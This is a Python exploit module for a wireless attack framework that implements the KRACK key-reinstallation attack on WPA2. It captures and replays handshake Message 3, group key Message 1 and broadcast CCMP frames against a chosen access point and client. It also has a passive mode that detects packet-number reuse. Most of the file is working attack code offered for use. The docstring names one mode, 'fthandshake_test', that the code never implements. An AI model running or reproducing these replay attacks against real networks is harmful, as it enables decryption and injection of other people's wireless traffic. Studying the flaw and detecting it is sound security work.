#!/usr/bin/env python3
# Author: André Henrique (@mrhenrike) | União Geek — https://github.com/Uniao-Geek
"""Native KRACK — Key Reinstallation Attacks on WPA2 (CVE-2017-13077..13088).

Implements detection and exploitation of key reinstallation vulnerabilities
in the WPA2 4-way handshake and group key handshake:

  - 4way_replay        Replay Message 3 to trigger PTK reinstallation
  - group_replay       Replay Group Key Message 1 to reset group PN
  - fthandshake_test   Test FT (Fast Transition) reassociation key reuse
  - broadcast_replay   Replay broadcast frames to test group key replay
  - monitor            Passive monitoring for key reinstallation indicators

The attack forces nonce/counter reuse in CCMP, enabling frame decryption
and potential injection.

Requires: Monitor mode interface with injection, modified hostapd
(for Message 3 replay in AP mode). Passive tests work with any adapter.

Dependencies: scapy, pycryptodome.

Version: 1.0.0
"""

from __future__ import annotations

import logging
import os
import struct
import threading
import time
from collections import defaultdict
from typing import Dict, List, Optional, Set, Tuple

from wirelessxpl.core.exploit import *

logger = logging.getLogger(__name__)

try:
    from scapy.all import (
        ARP, EAPOL, ICMP, IP, LLC, SNAP,
        Dot11, Dot11Auth, Dot11CCMP, Dot11Deauth, Dot11QoS,
        RadioTap, Raw, conf, get_if_hwaddr, sendp, sniff,
    )
    from scapy.contrib.wpa_eapol import WPA_key
    HAS_SCAPY = True
except ImportError:
    HAS_SCAPY = False

try:
    from Cryptodome.Cipher import AES
    HAS_CRYPTO = True
except ImportError:
    try:
        from Crypto.Cipher import AES
        HAS_CRYPTO = True
    except ImportError:
        HAS_CRYPTO = False

HANDSHAKE_TRANSMIT_INTERVAL = 2

# EAPOL Key Info flags
EAPOL_KEY_INFO_PAIRWISE = 0x0008
EAPOL_KEY_INFO_ACK = 0x0080
EAPOL_KEY_INFO_MIC = 0x0100
EAPOL_KEY_INFO_SECURE = 0x0200
EAPOL_KEY_INFO_ENCRYPTED = 0x1000


class IvTracker:
    """Track IVs/PNs per MAC address for replay detection."""

    def __init__(self) -> None:
        self._seen: Dict[str, List[int]] = defaultdict(list)
        self._reuse_count: Dict[str, int] = defaultdict(int)

    def observe(self, mac: str, pn: int) -> bool:
        """Record a PN observation. Returns True if reuse detected."""
        history = self._seen[mac]
        reused = False

        if history and pn <= history[-1] and pn != 0:
            self._reuse_count[mac] += 1
            reused = True

        history.append(pn)
        if len(history) > 2000:
            self._seen[mac] = history[-1000:]

        return reused

    def get_stats(self) -> Dict[str, Dict[str, int]]:
        """Get IV/PN statistics per MAC."""
        return {
            mac: {
                "observed": len(pns),
                "min": min(pns) if pns else 0,
                "max": max(pns) if pns else 0,
                "reuses": self._reuse_count[mac],
            }
            for mac, pns in self._seen.items()
        }


def _extract_pn(pkt) -> int:
    """Extract 48-bit Packet Number from Dot11CCMP."""
    ccmp = pkt[Dot11CCMP]
    return (ccmp.PN5 << 40 | ccmp.PN4 << 32 | ccmp.PN3 << 24 |
            ccmp.PN2 << 16 | ccmp.PN1 << 8 | ccmp.PN0)


def _is_eapol_msg3(pkt) -> bool:
    """Check if packet is EAPOL 4-way handshake Message 3."""
    if not pkt.haslayer(EAPOL):
        return False
    try:
        wpa = pkt[WPA_key]
        key_info = wpa.key_info
        return bool(
            (key_info & EAPOL_KEY_INFO_PAIRWISE)
            and (key_info & EAPOL_KEY_INFO_ACK)
            and (key_info & EAPOL_KEY_INFO_MIC)
            and (key_info & EAPOL_KEY_INFO_SECURE)
            and (key_info & EAPOL_KEY_INFO_ENCRYPTED)
        )
    except Exception:
        return False


def _is_eapol_msg1(pkt) -> bool:
    """Check if packet is EAPOL 4-way handshake Message 1."""
    if not pkt.haslayer(EAPOL):
        return False
    try:
        wpa = pkt[WPA_key]
        key_info = wpa.key_info
        return bool(
            (key_info & EAPOL_KEY_INFO_PAIRWISE)
            and (key_info & EAPOL_KEY_INFO_ACK)
            and not (key_info & EAPOL_KEY_INFO_MIC)
        )
    except Exception:
        return False


def _is_group_msg1(pkt) -> bool:
    """Check if packet is Group Key handshake Message 1."""
    if not pkt.haslayer(EAPOL):
        return False
    try:
        wpa = pkt[WPA_key]
        key_info = wpa.key_info
        return bool(
            not (key_info & EAPOL_KEY_INFO_PAIRWISE)
            and (key_info & EAPOL_KEY_INFO_ACK)
            and (key_info & EAPOL_KEY_INFO_MIC)
            and (key_info & EAPOL_KEY_INFO_SECURE)
            and (key_info & EAPOL_KEY_INFO_ENCRYPTED)
        )
    except Exception:
        return False


class Exploit(Exploit):
    """Native KRACK — WPA2 key reinstallation attack."""

    __info__ = {
        "name": "KRACK Attack (CVE-2017-13077..13088)",
        "description": (
            "Key Reinstallation Attacks on WPA2. Detects and exploits nonce "
            "reuse in the 4-way handshake (Message 3 replay), group key "
            "handshake (group PN reset), and FT reassociation. Passive "
            "monitoring for IV/PN reuse patterns. Native scapy implementation."
        ),
        "authors": (
            "André Henrique (@mrhenrike) | União Geek",
            "Original research: Mathy Vanhoef & Frank Piessens (2017)",
        ),
        "references": (
            "https://www.krackattacks.com/",
            "https://github.com/vanhoefm/krackattacks-scripts",
        ),
        "devices": ("wifi",),
    }

    interface = OptString("wlan0mon", "Monitor mode interface")
    attack = OptString(
        "monitor",
        "Mode: monitor | msg3_replay | group_replay | broadcast_replay",
    )
    target_bssid = OptMAC("", "Target AP BSSID")
    target_client = OptMAC("", "Target client MAC")
    channel = OptInteger(1, "Wi-Fi channel")
    monitor_timeout = OptInteger(120, "Passive monitoring duration (seconds)")
    replay_count = OptInteger(5, "Number of handshake replay attempts")
    replay_interval = OptFloat(2.0, "Seconds between replays")
    output_pcap = OptString("krack_capture.pcap", "Output PCAP for captured handshakes")
    dry_run = OptBool(False, "Show configuration without executing")

    def __init__(self) -> None:
        super().__init__()
        self._iv_tracker = IvTracker()
        self._captured_msg3: List = []
        self._captured_group: List = []
        self._stop = threading.Event()

    def _passive_monitor(self) -> None:
        """Passively monitor for KRACK indicators (IV/PN reuse, handshake replays)."""
        print_status("Passive KRACK monitoring for {}s...".format(self.monitor_timeout))
        handshake_count = {"msg1": 0, "msg3": 0, "group1": 0}

        def _analyze(pkt):
            if pkt.haslayer(Dot11CCMP) and pkt.addr2:
                pn = _extract_pn(pkt)
                reused = self._iv_tracker.observe(pkt.addr2, pn)
                if reused:
                    print_success("[KRACK] PN reuse detected: {} PN={}".format(
                        pkt.addr2, pn))

            if _is_eapol_msg1(pkt):
                handshake_count["msg1"] += 1
            elif _is_eapol_msg3(pkt):
                handshake_count["msg3"] += 1
                self._captured_msg3.append(pkt)
                logger.info("Captured 4-way Msg3 from %s", pkt.addr2)
            elif _is_group_msg1(pkt):
                handshake_count["group1"] += 1
                self._captured_group.append(pkt)
                logger.info("Captured Group Key Msg1 from %s", pkt.addr2)

        try:
            sniff(iface=self.interface, prn=_analyze, store=False,
                  timeout=self.monitor_timeout)
        except KeyboardInterrupt:
            print_info("\nMonitoring interrupted.")

        print_info("\nHandshake messages observed:")
        for msg_type, count in handshake_count.items():
            print_info("  {}: {}".format(msg_type, count))

        stats = self._iv_tracker.get_stats()
        if stats:
            print_info("\nPN/IV statistics:")
            for mac, s in stats.items():
                reuse_indicator = " [REUSE DETECTED]" if s["reuses"] > 0 else ""
                print_info("  {}: {} PNs, range [{}-{}], reuses={}{}".format(
                    mac, s["observed"], s["min"], s["max"],
                    s["reuses"], reuse_indicator))

    def _msg3_replay(self) -> None:
        """Replay 4-way handshake Message 3 to trigger key reinstallation.

        Captures a legitimate Msg3 and replays it to force the client to
        reinstall the PTK, resetting the nonce counter.
        """
        if not self._captured_msg3:
            print_status("No captured Msg3 yet. Monitoring for handshakes...")
            def _capture(pkt):
                if _is_eapol_msg3(pkt):
                    self._captured_msg3.append(pkt)
                    return True
            try:
                sniff(iface=self.interface, stop_filter=_capture,
                      timeout=60, store=False)
            except KeyboardInterrupt:
                pass

        if not self._captured_msg3:
            print_error("Could not capture Msg3. Trigger a handshake first.")
            return

        msg3 = self._captured_msg3[-1]
        print_status("Replaying Msg3 ({} times, interval={}s)...".format(
            self.replay_count, self.replay_interval))

        for i in range(self.replay_count):
            sendp(msg3, iface=self.interface, verbose=False)
            print_info("  Replay {} sent.".format(i + 1))
            time.sleep(self.replay_interval)

        print_success("Msg3 replay complete. Monitor for PN resets on the client.")

    def _group_replay(self) -> None:
        """Replay Group Key handshake Message 1.

        Forces reinstallation of the group temporal key (GTK), resetting
        the group PN counter and enabling broadcast frame replay.
        """
        if not self._captured_group:
            print_status("No captured Group Msg1 yet. Monitoring...")
            def _capture(pkt):
                if _is_group_msg1(pkt):
                    self._captured_group.append(pkt)
                    return True
            try:
                sniff(iface=self.interface, stop_filter=_capture,
                      timeout=60, store=False)
            except KeyboardInterrupt:
                pass

        if not self._captured_group:
            print_error("Could not capture Group Key Msg1.")
            return

        group_msg = self._captured_group[-1]
        print_status("Replaying Group Key Msg1 ({} times)...".format(self.replay_count))

        for i in range(self.replay_count):
            sendp(group_msg, iface=self.interface, verbose=False)
            time.sleep(self.replay_interval)

        print_success("Group Key Msg1 replay complete.")

    def _broadcast_replay(self) -> None:
        """Test broadcast frame replay protection.

        Captures a broadcast frame and replays it to test if the receiver
        accepts frames with previously used PNs.
        """
        print_status("Capturing broadcast frames for replay test...")
        captured = []

        def _capture_broadcast(pkt):
            if (pkt.haslayer(Dot11CCMP) and pkt.addr1 and
                    pkt.addr1 == "ff:ff:ff:ff:ff:ff"):
                captured.append(pkt)
                if len(captured) >= 3:
                    return True

        try:
            sniff(iface=self.interface, stop_filter=_capture_broadcast,
                  timeout=30, store=False)
        except KeyboardInterrupt:
            pass

        if not captured:
            print_error("No broadcast frames captured.")
            return

        print_status("Replaying {} broadcast frames...".format(len(captured)))
        for frame in captured:
            for _ in range(self.replay_count):
                sendp(frame, iface=self.interface, verbose=False)
                time.sleep(0.1)

        print_success("Broadcast replay test complete. Check target for acceptance.")

    def run(self) -> None:
        """Execute KRACK attack/test."""
        if not HAS_SCAPY:
            print_error("scapy is required. Install: pip install scapy")
            return

        if self.dry_run:
            print_info("KRACK Attack Configuration:")
            print_info("  Interface: {}".format(self.interface))
            print_info("  Mode:      {}".format(self.attack))
            print_info("  BSSID:     {}".format(self.target_bssid))
            print_info("  Client:    {}".format(self.target_client))
            print_info("  Channel:   {}".format(self.channel))
            print_info("  Timeout:   {}s".format(self.monitor_timeout))
            return

        if self.attack != "monitor" and os.getuid() != 0:
            print_error("Root privileges required for active attacks.")
            return

        modes = {
            "monitor": self._passive_monitor,
            "msg3_replay": self._msg3_replay,
            "group_replay": self._group_replay,
            "broadcast_replay": self._broadcast_replay,
        }

        handler = modes.get(self.attack)
        if handler:
            handler()
        else:
            print_error("Unknown mode: {}. Options: {}".format(
                self.attack, " | ".join(modes.keys())))
